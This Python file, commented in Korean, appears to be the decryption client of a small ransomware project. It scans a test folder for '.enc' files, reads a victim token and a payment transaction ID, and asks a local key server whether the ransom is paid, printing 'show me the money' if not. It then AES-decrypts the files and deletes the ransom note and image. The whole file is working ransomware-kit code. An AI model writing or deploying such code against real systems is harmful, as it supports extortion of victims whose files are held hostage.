import qrcode
import time
import os
import json
import requests

from Crypto.Cipher import AES

class AESCipher:
    # key = 암호화에서 사용하는 key (16, 32, 64 ... bytes)
    def __init__(self, key):
        self.key = key
        self.BS = 16
        self.pad =lambda s: s + (self.BS - len(s) % self.BS) * chr(self.BS - len(s) % self.BS).encode()
        self.unpad = lambda s: s[:-ord(s[len(s) - 1:])]

    # 누가봐도 복호화
    # enc = 암호화된 데이터
    def decrypt(self, enc):
        enc = bytes.fromhex(enc)
        iv = enc[:16]
        enc = enc[16:]
        cipher = AES.new(self.key.encode(), AES.MODE_CBC , iv)
        return self.unpad(cipher.decrypt(enc).decode())

class Decryptor:
    # path = 암호화된 파일 경로
    def __init__(self, path="./test"):
        self._path = path
        self._files = []

    # 파일 시스템을 스캔
    # self._files = 복호화할 파일 리스트
    # .enc 파일만 필터링
    # return 값은 파일 개수
    def scan(self):
        for root, dirs, files in os.walk(self._path):
            for filename in files :
                filepath = os.path.join(root, filename)
                if filename.endswith(".enc"):
                    self._files.append(filepath)
        return len(self._files)

    # 복호화
    # 암호화된 파일의 확장자는 {원본파일명}.{enc}
    def decrypt(self, key):
        aes = AESCipher(key)
        for filepath in self._files:
            data = open(filepath, "r").read()
            dec = aes.decrypt(data)

            f = open(filepath.replace(".enc", ""), "w")
            f.write(dec)
            f.close()

            os.remove(filepath)
        

    # token을 인자로 서버애서 key 반환받음
    def get_key(self, token):
        return requests.get("http://127.0.0.1:5000/get_key?token="+token).json()       

    # 실행
    def run(self):
        self.token = open("token.txt", "r").read()
        # Scan the file system
        num_files = self.scan()
        if num_files == 0:
            return
        

        self.txid = input("TXID : ")
        # Get the key from the server
        res = requests.get("http://127.0.0.1:5000/get_key?token=" + self.token + "&txid=" + self.txid).json()

        if res.get("is_paid") == False:
            print("show me the money")
            return
        key = res.get("key", "")
        self.decrypt(key)
        os.remove("token.txt")
        os.remove("rickRolled.png")
        os.remove("README.txt")
        

if __name__ == '__main__':
    decryptor = Decryptor()
    decryptor.run()
